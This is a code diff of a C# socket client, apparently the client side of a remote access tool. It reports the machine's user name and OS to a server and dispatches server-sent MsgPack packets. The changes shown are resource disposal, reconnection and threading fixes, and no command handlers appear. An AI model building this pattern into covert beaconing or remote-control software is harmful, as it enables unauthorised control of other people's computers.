@@ -2,6 +2,7 @@
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
@@ -59,19 +60,20 @@ namespace Client
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString();
             return msgpack.Encode2Bytes();
-
         }
 
         public static void ReadServertData(IAsyncResult ar)
         {
-            if (client.Connected == false)
-            {
-                client.Close();
-                client.Dispose();
-                InitializeClient();
-            }
             try
             {
+                if (client.Connected == false)
+                {
+                    client.Close();
+                    client.Dispose();
+                    MS.Dispose();
+                    InitializeClient();
+                }
+
                 int Recevied = client.EndReceive(ar);
 
                 if (Recevied > 0)
@@ -82,6 +84,7 @@ namespace Client
                         if (Buffer[0] == 0)
                         {
                             Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
+                            MS.Dispose();
                             MS = new MemoryStream();
                             if (Buffersize > 0)
                             {
@@ -100,7 +103,8 @@ namespace Client
                         MS.Write(Buffer, 0, Recevied);
                         if (MS.Length == Buffersize)
                         {
-                            Read(MS.ToArray());
+                            ThreadPool.QueueUserWorkItem(Read, MS.ToArray());
+                            MS.Dispose();
                             MS = new MemoryStream();
                             Buffer = new byte[1];
                             Buffersize = 0;
@@ -112,6 +116,7 @@ namespace Client
                 {
                     client.Close();
                     client.Dispose();
+                    MS.Dispose();
                     InitializeClient();
                 }
                 client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
@@ -120,14 +125,15 @@ namespace Client
             {
                 client.Close();
                 client.Dispose();
+                MS.Dispose();
                 InitializeClient();
             }
         }
 
-        public static void Read(byte[] Data)
+        public static void Read(object Data)
         {
             MsgPack unpack_msgpack = new MsgPack();
-            unpack_msgpack.DecodeFromBytes(Data);
+            unpack_msgpack.DecodeFromBytes((byte[])Data);
             Console.WriteLine("I recevied a packet from server: " + unpack_msgpack.ForcePathObject("Packet").AsString);
             switch (unpack_msgpack.ForcePathObject("Packet").AsString)
             {
